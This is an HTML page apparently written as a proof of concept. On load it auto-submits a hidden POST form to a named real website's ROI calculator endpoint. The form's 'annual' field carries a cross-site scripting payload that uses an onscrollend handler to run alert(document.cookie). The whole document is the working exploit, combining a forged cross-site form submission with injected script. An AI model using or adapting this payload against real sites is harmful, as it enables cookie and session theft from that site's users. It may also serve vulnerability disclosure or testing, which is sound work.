<!DOCTYPE html>
<html>
<head>
  <title>Auto POST Request with Payload</title>
</head>
<body>
  <script>
    window.onload = function() {
      // Define the payload data as an object
      const payload = {
  annual: "\"<a/href=google.com><a/onscrollend=alert(document.cookie) style=display:block;overflow:auto;border:1px/dashed;width:500px;height:100px;><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span/id=x>test</span></a>",

      };

      // Create a new form element
      const form = document.createElement("form");
      form.method = "POST";
      form.action = "https://www.kahootz.com/roi-calculator/?step=2"; // Replace with your API endpoint

      // Populate the form with hidden input fields for each payload key-value pair
      for (const key in payload) {
        if (payload.hasOwnProperty(key)) {
          const input = document.createElement("input");
          input.type = "hidden";
          input.name = key;
          input.value = payload[key];
          form.appendChild(input);
        }
      }

      // Append the form to the document and submit it
      document.body.appendChild(form);
      form.submit();
    };
  </script>
</body>
</html>
